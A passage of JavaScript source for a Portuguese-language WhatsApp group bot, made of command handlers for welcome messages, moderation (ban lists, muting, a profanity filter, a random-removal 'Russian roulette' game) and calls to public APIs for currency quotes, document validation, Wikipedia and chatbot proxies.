case 'bemvindo':
case 'welcome':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if (!isWelkom) {
dataGp[0].wellcome[0].bemvindo1 = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗕𝗘𝗠-𝗩𝗜𝗡𝗗𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isWelkom) {
dataGp[0].wellcome[0].bemvindo1 = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗕𝗘𝗠-𝗩𝗜𝗡𝗗𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'infodono':
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
let ppimg;
try {
ppimg = await client.profilePictureUrl(`${nmrdnofc1}@c.us`, 'image')
} catch {
ppimg = 'https://qu.ax/CDMtr.jpg'
}
const criador = `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞👨🏻‍💻⃞⃞⚝ NOME: I'm zenom
┃᨞⁞🆔️⃞⃞⚝ IDADE: 19
┃᨞⁞🇧🇷⃞⃞⚝ ORIGEM: BRASILEIRO
┃᨞⁞💬⃞⃞⚝ RECADO: GOOD BOY 
┃᨞⁞📆⃞⃞⚝ DATA: ${date}
┃᨞⁞📊⃞⃞⚝ TOTAL CMDS: ${totalcmds}
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`;
await randomreact();
await sleep(1000)
safeSendMessage(from, {image: {url: ppimg}, caption: criador, footer: `${NomeDoBot}`,
buttons: [
{
buttonId: `${prefix}ping`,
buttonText: { displayText: '「 ⚡️ 」𝐏𝐈𝐍𝐆「 ⚡️ 」' },
type: 1
},
{
buttonId: `${prefix}menu`,
buttonText: { displayText: '「 🫟 」𝐌𝐄𝐍𝐔「 🫟 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
break

case 'infocmd': 
case 'info': 
if(!q) return enviar(`🔹 Uso correto: ${prefix + command} play`)
const CMD_P = JSON.parse(fs.readFileSync("./dono/media/infocmd.json")); 
const searchCmds = CMD_P.map(i => i.command).indexOf(q)
if(searchCmds < 0) return enviar("A explicação do comando ainda não está disponível..")
const returnMessage = CMD_P[searchCmds].info.replace(/#prefixo#/g)
enviar(returnMessage)
break

case 'infocmd_add': case 'add_infocmd':
if(!SoDono) return enviar(arise.donosmt)
const CMD_S = JSON.parse(fs.readFileSync("./dono/media/infocmd.json")); 
dirInfoCmd = "./dono/media/infocmd.json"
var [y, x] = q.split('|')
if(!q.includes("|")) return enviar(`🔹 Uso correto: ${prefix + command} comando|info`)
if(q.lastIndexOf("|") < 0) return enviar(`Faltando a segunda |\nExemplo: ${prefix + command} comando|info`)
kirv = []
for (i of CMD_S) {kirv.push(i.command)}
if(kirv.indexOf(y) >= 0) return enviar("A informação sobre este comando já foi adicionada, ou seja, já é existente...")
CMD_S.push({command: y, info: x})
fs.writeFileSync(dirInfoCmd, JSON.stringify(CMD_S, null, 2))
enviar(`Informação sobre o comando ${y} foi atribuida a ele com sucesso...`)
break 

case 'infocmd_del': case 'del_infocmd':
if(!SoDono) return enviar(arise.donosmt) 
const CMD_D = JSON.parse(fs.readFileSync("./dono/media/infocmd.json")); 
var i7 = CMD_D.map(i => i.command).indexOf(q.trim())
dirInfoCmd = "./dono/media/infocmd.json"
CMD_D.splice(i7, 1)
fs.writeFileSync(dirInfoCmd, JSON.stringify(CMD_D, null, 2))
enviar(`A informação sobre o comando ${q} foi removida com sucesso...`)
break

case 'legendabv':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar('*Escreva a mensagem de boas-vindas*')
teks = body.slice(11)
if(isWelkom) {
dataGp[0].wellcome[0].legendabv = teks
setGp(dataGp)
enviar('*Mensagem de boas vindas definida com sucesso!*')
} else {
enviar(`Ative o bemvindo 1`)
}
break

case 'legendabv2':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar('*Escreva a mensagem de boas-vindas*')
teks = body.slice(12)
if(isWelkom2) {
dataGp[0].wellcome[1].legendabv = teks
setGp(dataGp)
enviar('*Mensagem de boas vindas2 definida com sucesso!*')
} else {
enviar(`Ative o bemvindo2 1`)
}
break

case 'legendasaiu':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar("Escreva a mensagem de saída ou para desativar, use: 0")
teks = body.slice(13)
if(isWelkom) {
dataGp[0].wellcome[0].legendasaiu = Number(teks) === 0 ? 0 : teks
setGp(dataGp)
enviar('Mensagem de saída definida com sucesso!')
} else {
enviar(`Ative o bemvindo 1 para o recurso de edição de mensagem.`)
}
break;

case 'legendasaiu2':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(q.length < 1) return enviar('Escreva a mensagem de saída ou para desativar, use: 0')
if(isWelkom2) {
dataGp[0].wellcome[1].legendasaiu = Number(teks) === 0 ? 0 : q
setGp(dataGp)
enviar('Mensagem de saída [2] definida com sucesso!')
} else {
enviar(`Ative o bemvindo2 1 para o recurso de edição de mensagem.`)
}
break;

case 'legenda_estrangeiro':
case 'legenda_estrangeiros': 
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar('*Escreva a mensagem de remoção de estrangeiros*')
if(isAntifake) {
dataGp[0].legenda_estrangeiro = q
setGp(dataGp)
enviar('*Mensagem de remoção de estrangeiros definida com sucesso!*')
} else {
enviar(`Ative o antifake primeiro com antifake 1`)
}
break

case 'legenda_video': 
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar('*Escreva a mensagem de remoção de estrangeiros*')
dataGp[0].legenda_video = q
setGp(dataGp)
enviar('*Mensagem de remoção de video definida com sucesso!*')
break

case 'legenda_imagem': 
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar('*Escreva a mensagem de remoção de estrangeiros*')
dataGp[0].legenda_imagem = q
setGp(dataGp)
enviar('*Mensagem de remoção de imagem definida com sucesso!*')
break

case 'legenda_documento': 
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q) return enviar('*Escreva a mensagem de remoção de estrangeiros*')
dataGp[0].legenda_documento = q
setGp(dataGp)
enviar('*Mensagem de remoção de documento definida com sucesso!*')
break

case 'addautorm':
case 'addautoban':
case 'listanegra':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins && !SoDono) return enviar('Precisa ser Dono ou Adm')
if(!mrc_ou_numero) return enviar("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja adicionar na lista negra..")
if(dataGp[0].listanegra.includes(mrc_ou_numero)) return enviar('*Esse Número ja esta incluso*')
dataGp[0].listanegra.push(mrc_ou_numero)
setGp(dataGp)
enviar(`*Número adicionado a lista de autoban*`)
break

case 'autobang':
case 'listanegrag':
if(!SoDono) return enviar(arise.donosmt)
if(!mrc_ou_numero) return enviar("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja adicionar na lista negra Global..")
if(listanegraG.includes(mrc_ou_numero)) return enviar('*Esse Número ja esta incluso*')
listanegraG.push(mrc_ou_numero)
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
enviar(`*Número adicionado a lista de autoban*`)
break

case 'tirardalistag':
if(!SoDono) return enviar(arise.donosmt)
if(!mrc_ou_numero) return enviar("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja tirar da lista negra..")
if(!listanegraG.includes(mrc_ou_numero)) return enviar('*Esse Número não esta incluso*')
var i = listanegraG.indexOf(mrc_ou_numero)
listanegraG.splice(i, 1)
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
enviar(`*Número foi removido da lista negra*`)
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins && !SoDono) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!mrc_ou_numero) return enviar("Marque a mensagem do usuário com o comando ou utilize o comando com o número do usuário que deseja tirar da lista negra..")
if(!dataGp[0].listanegra.includes(mrc_ou_numero)) return enviar('*Esse Número não esta incluso*')
var i = dataGp[0].listanegra.indexOf(mrc_ou_numero)
dataGp[0].listanegra.splice(i, 1)
setGp(dataGp)
enviar(`*Número foi removido da lista de autoban*`)
break

case 'listban':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(dataGp[0].listanegra.length < 1) return enviar('*Nenhum Número não foi adicionado*')
teks = '*Números que vou moer na porrada se voltar:*\n'
for(i=0;i<dataGp[0].listanegra.length;++i) {
teks += `*${dataGp[0].listanegra[i].split('@')[0]}*\n`
}
teks += '*Esses ai vou descer meu martelo do ban.*'
enviar(teks)
break

case 'mute':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar('O bot precisa ser adm pra executar essa ação.')
if (info.message.extendedTextMessage === null) return enviar('Marque o número que deseja mutar.')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(isMuted) {
var ind = GroupsMutedActived.indexOf(from)
for (let _ of mentioned) {
var teks = `Olá *@${_.split('@')[0]}*, você acaba de ser mutado, ação realizada pelo(a) adm: *@${sender.split('@')[0]}*.`
muted[ind].numbers.push(_)
}
fs.writeFileSync('./banco de dados/usuarios/muted.json', JSON.stringify(muted, null, 2))
teks += '\n–\n• Caso você dar um piu, sua(s) mensagem(ns) vai ser apagada.'
mentions(teks, [mentioned, sender], true)
} else {
 const data = {
jid: from,
numbers: mentioned
}
muted.push(data)
fs.writeFileSync('./banco de dados/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `Olá *@${_.split('@')[0]}*, você acaba de ser mutado, ação realizada pelo(a) adm: *@${sender.split('@')[0]}*.`
}
teks += '\n–\n• Caso você dar um piu, sua(s) mensagem(ns) vai ser apagada.'
mentions(teks, [mentioned, sender], true)
}
break

case 'desmute':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar('O bot precisa ser adm pra executar essa ação.')
if (info.message.extendedTextMessage === null) return enviar('Marque o número que deseja desmutar.')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
var ind = GroupsMutedActived.indexOf(from)
if(isMuted) {
for(let _ of mentioned) {
if(muted[ind].numbers.indexOf(_) >= 0) {
var rmind = muted[ind].numbers.indexOf(_)
muted[ind].numbers.splice(rmind, 1)
}
}
fs.writeFileSync('./banco de dados/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `Olá usuário *@${_.split('@')[0]}* você acaba de ser desmutado pelo(a) adm *@${sender.split('@')[0]}*.`
}
teks += '\n–\n• Agora você pode falar a vontade no grupo, sem interrupções.'
mentions(teks, [mentioned, sender], true)
} else {
const data = {
jid: from,
numbers: []
}
muted.push(data)
fs.writeFileSync('./banco de dados/usuarios/muted.json', JSON.stringify(muted, null, 2) + '\n')
for (let _ of mentioned) {
teks = `Olá usuário @${_.split('@')[0]} você acaba de ser desmutado pelo(a) adm @${sender.split('@')[0]}.`
}
teks += '\n–\n• Agora você pode falar a vontade no grupo, sem interrupções.'
mentions(teks, [mentioned, sender], true)
}
break

case 'roletarussa':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
TAMBOR = ["na perna.","na cabeça.","no pescoço.","no peito.","no olho.","no estômago.","na boca.","na perna.","na testa.","no braço."]
C2 = somembros[Math.floor(Math.random() * somembros.length)]
if(somembros.length == 0) return enviar("Não existe *membros comuns* no grupo, somente admins.")
if(C2 === sender || C2 === botNumber) return mentions(`Escolhi *@${C2.split('@')[0]}*, mas conseguiu escapar...`, [C2], true)
if(C2 === sender || C2 === numerodono[0]) return mentions(`Escolhi *@${C2.split('@')[0]}*, mas conseguiu escapar...`, [C2], true)		
enviar(`A escolha é minha! 1 membro irá morrer, que os jogos comecem...`)
setTimeout(() => { 
mentions(`Que pena... você não sobreviveu ao meu jogo *@${C2.split('@')[0]}*, hora de enterrar o cadáver, infelizmente morreu com tiro ${TAMBOR[Math.floor(Math.random() * (TAMBOR.length))]}`, [C2], true) 
}, 5000)	 
setTimeout(() => {
client.groupParticipantsUpdate(from, [C2], "remove")
}, 6000)
break

case 'photoleap': 
try {
if (!q) return enviar("O que você deseja criar através de seu questionamento?")
data = await fetchJson(`https://vihangayt.me/tools/photoleap?q=${q}`)
safeSendMessage(from, {image: {url: data.data}}, {quoted: non}).catch(() => {
return enviar(mess.error())
})
} catch {
enviar(mess.error())
}
break

case 'extenso': // Invertexto-API com 3.000 requisições mensais, fique atento! [📍]
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium);
if(!q.includes(".")) return enviar(`❌️ - Coloque apenas números para realizar a transformação de digitos numérico para números em extenso.\nPor exemplo: ${prefix}*extenso 500.00 ou 756.50*, tudo que você colocar os valores deve colocar um ponto(.) para converter os valores.`)
try {
data = await fetchJson(`https://api.invertexto.com/v1/number-to-words?token=${API_KEY_INVERTEXTO}&number=${q}&language=pt&currency=BRL`);
enviar(`*${q}* : ${capitalizeFirstLetter(data.text)}`);
} catch(e) {
enviar(mess.error())
}
break;

case 'validarcpf': case 'validarcnpj':
if(command === "validarcpf") {
if(!q) return enviar("Digite um CPF para realizar a verificação se é válido ou inválido...")
if(q.length < 11) return enviar("Você digitou um cpf que não tem 11 dígitos, verifique se colocou pontuação, se estiver retire.")
try {
data = await fetchJson(`https://api.invertexto.com/v1/validator?token=${API_KEY_INVERTEXTO}&value=${q}`)
if(data.valid == true) return enviar("Válido.")
if(data.valid == false) return enviar("Inválido.")
} catch(e) {
enviar(mess.error())
}
} else if(command === "validarcnpj") {
if(!q) return enviar("Digite um CNPJ para realizar a verificação se é válido ou inválido!")
if(q.length < 14) return enviar("Você digitou um CNPJ que não tem 14 dígitos, verifique se colocou pontuação, se estiver retire.")
try {
data = await fetchJson(`https://api.invertexto.com/v1/validator?token=${API_KEY_INVERTEXTO}&value=${q}`)
if(data.valid == true) return enviar("Válido.")
if(data.valid == false) return enviar("Inválido.")
} catch(e) {
enviar(mess.error())
}
}
break;  

case 'gemini': {
await escrever()
reagir(from, '🧠')
if(!q) return enviar(`Em quê eu posso ajudar você?`)
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
try {
const openan = await fetchJson(`https://zero-two-apis.com.br/gemini/texto/imagem?query=${q}&apikey=${KEY_ZERO}`)
enviar(`🤖: ${openan.resposta}`)
} catch (e){
return enviar("🤖: Resposta não encontrada.")
}
}
break

case 'gemini-pro': {
await escrever()
reagir(from, '🧠')
if(!q) return enviar(`Como posso ajudar?`)
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
try {
const openaxv = await fetchJson(`https://zero-two-apis.com.br/api/gemini/v1?query=${q}&apikey=${KEY_ZERO}`);
enviar(`🤖: ${openaxv.resultado.resposta}`)
} catch (e){
return enviar("🤖: Resposta não encontrada.")
}
}
break

case 'chat-gpt': {
await escrever()
reagir(from, '🧠')
if(!q) return enviar(`Cade a pergunta?`)
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
try {
const openaxv = await fetchJson(`https://zero-two-apis.com.br/api/gemini/v1?query=${q}&apikey=${KEY_ZERO}`);
enviar(`🤖: ${openaxv.resultado.resposta}`)
} catch (e){
return enviar("🤖: Resposta não encontrada.")
}
}
break

case 'gpt-4': {
await escrever()
reagir(from, '🧠')
if(!q) return enviar(`Cade a pergunta?`)
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
try {
const openaxv = await fetchJson(`https://zero-two-apis.com.br/api/gemini/v1?query=${q}&apikey=${KEY_ZERO}`);
enviar(`🤖: ${openaxv.resultado.resposta}`)
} catch (e){
return enviar("🤖: Resposta não encontrada.")
}
}
break

case 'meta-ai': {
await escrever()
reagir(from, '🧠')
if(!q) return enviar(`Cade a pergunta?`)
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
try {
const openaxv = await fetchJson(`https://zero-two-apis.com.br/api/gemini/v1?query=${q}&apikey=${KEY_ZERO}`);
enviar(`🤖: ${openaxv.resultado.resposta}`)
} catch (e){
return enviar("🤖: Resposta não encontrada.")
}
}
break

case 'bard-ai': {
await escrever()
reagir(from, '🧠')
if(!q) return enviar(`Cade a pergunta?`)
if(isCmdPremium && !isPremium && !isGroupAdmins) return enviar(arise.premium)
try {
const openaxv = await fetchJson(`https://zero-two-apis.com.br/api/gemini/v1?query=${q}&apikey=${KEY_ZERO}`);
enviar(`🤖: ${openaxv.resultado.resposta}`)
} catch (e){
return enviar("🤖: Resposta não encontrada.")
}
}
break

case 'wikipedia': case 'wiki':
try {
  if(!q) return enviar(`🔹 Uso correto: ${prefix + command} JavaScript`)
wikip = await axios.get(`https://pt.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=${encodeURIComponent(q)}&prop=info&inprop=url`);
wikis = await axios.get(`https://pt.wikipedia.org/w/api.php?format=json&action=query&prop=extracts&exintro&explaintext&redirects=1&pageids=${wikip.data.query.search[0].pageid}`);
msgSemQuoted(mess.wikiResposta(wikis))
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
enviar('Nada foi encontrado, com base em sua pergunta.. Especifique um pouco!')
} else {
enviar('Nada foi encontrado, com base em sua pergunta.. Especifique um pouco!')
}
}
break

case 'cotacao': {
if (isCmdPremium && !isPremium) return enviar(arise.premium)
moedas = ["dolar", "euro", "bitcoin", "libra", "ethereum"]
if(!moedas.includes(q_2)) return enviar("A moeda está inexistente em meu banco de dados!\n*Disponíveis:* dolar, euro, bitcoin, libra, ethereum\n*Observação:* Use letras minúsculas para não ocorrer erros!")
if (encodeURIComponent(q) == "dolar") {
var money = "USD-BRL";
} else if (encodeURIComponent(q) == "euro") {
var money = "EUR-BRL";
} else if (encodeURIComponent(q) == "bitcoin") {
var money = "BTC-BRL";
} else if (encodeURIComponent(q) == "libra") {
var money = "GBP-BRL";
} else if (encodeURIComponent(q) == "ethereum") {
var money = "ETH-BRL";
}
axios.get(`https://economia.awesomeapi.com.br/last/${money}`)
.then((response) => {
if (encodeURIComponent(q) == "dolar") {
var resposta = response.data.USDBRL;
} else if (encodeURIComponent(q) == "euro") {
var resposta = response.data.EURBRL;
} else if (encodeURIComponent(q) == "bitcoin") {
var resposta = response.data.BTCBRL;
} else if (encodeURIComponent(q) == "ethereum") {
var resposta = response.data.ETHBRL;
} else if (encodeURIComponent(q) == "libra") {
var resposta = response.data.GBPBRL;
}
enviar(mess.quoteCurrencies(resposta));
}).catch((response) => {
enviar("Erro ao obter informações!️");
});
}
break;

case 'simih':
if(!isGroupAdmins) return enviar(arise.adm)
if(!isSimi) {
dataGp[0].simi1 = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗦𝗜𝗠𝗜𝗛 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isSimi) {
dataGp[0].simi1 = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗦𝗜𝗠𝗜𝗛 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'simih2':
if(!isGroupAdmins) return enviar(arise.adm)
if(!isSimi2) {
dataGp[0].simi2 = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗦𝗜𝗠𝗜𝗛2 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isSimi2) {
dataGp[0].simi2 = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗦𝗜𝗠𝗜𝗛2 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'autofigu': case 'autosticker':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAutofigu) {
dataGp[0].autosticker = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗙𝗜𝗚𝗨 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAutofigu) {
dataGp[0].autosticker = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗙𝗜𝗚𝗨 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'autorepo':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isAutorepo) {
dataGp[0].autoresposta = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗥𝗘𝗣𝗢 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isAutorepo) {
dataGp[0].autoresposta = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗨𝗧𝗢-𝗥𝗘𝗣𝗢 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'modozoeira':
case 'modozoeiras':  
case 'modobrincadeira':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isModobn) {
dataGp[0].jogos = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗭𝗢𝗘𝗜𝗥𝗔 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isModobn) {
dataGp[0].jogos = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗭𝗢𝗘𝗜𝗥𝗔 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'leveling':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isLevelingOn) {
dataGp[0].level = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗟𝗘𝗩𝗘𝗟𝗜𝗡𝗚 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isLevelingOn) {
dataGp[0].level = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗟𝗘𝗩𝗘𝗟𝗜𝗡𝗚 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'bangp':
case 'unbangp':
if(!isGroup) return enviar(arise.grupo)
if(!SoDono) return enviar(arise.donosmt)
if(!isBanchat) {
dataGp[0].bangp = true
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗕𝗔𝗡𝗚𝗣 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
} else if(isBanchat) {
dataGp[0].bangp = false
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗕𝗔𝗡𝗚𝗣 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
}
break

case 'boton':
case 'botoff':
if(!SoDono) return enviar(arise.donosmt)
if(!isBotoff) {
nescessario.botoff = true
setNes(nescessario)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗕𝗢𝗧𝗢𝗙𝗙 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
} else if(isBotoff) {
nescessario.botoff = false
setNes(nescessario)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗕𝗢𝗧𝗢𝗙𝗙 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
}
break

case 'antipalavrão':
case 'antipalavrao':  
case 'antipalavra':    
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
if(!isPalavrao) {
dataGp[0].antipalavrao.active = true
setGp(dataGp)
enviar('🟢 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗣𝗔𝗟𝗔𝗩𝗥𝗔 𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 🟢')
} else if(isPalavrao) {
dataGp[0].antipalavrao.active = false
setGp(dataGp)
enviar('⛔ 𝗠𝗢𝗗𝗢 𝗔𝗡𝗧𝗜-𝗣𝗔𝗟𝗔𝗩𝗥𝗔 𝗗𝗘𝗦𝗔𝗧𝗜𝗩𝗔𝗗𝗢 𝗡𝗘𝗦𝗦𝗘 𝗖𝗛𝗔𝗧 𝗖𝗢𝗠 𝗦𝗨𝗖𝗘𝗦𝗦𝗢 ⛔️')
}
break

case 'addpalavra':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isPalavrao) return enviar('Anti palavrão desativado!')
if(!q) return enviar( `Use assim : ${prefix + command} [palavrão]. exemplo ${prefix + command} puta`)
texto = args.join(' ').toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "")
if(isPalavras.includes(texto)) return enviar('Já foi adicionada')
dataGp[0].antipalavrao.palavras.push(texto)
setGp(dataGp)
enviar('Palavrão adicionado com sucesso!')
break

case 'delpalavra':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isPalavrao) return enviar('Anti palavrão desativado!')
if(!q) return enviar(`Use assim: ${prefix + command} [palavrão]. Exemplo: ${prefix + command} Rapariga`)
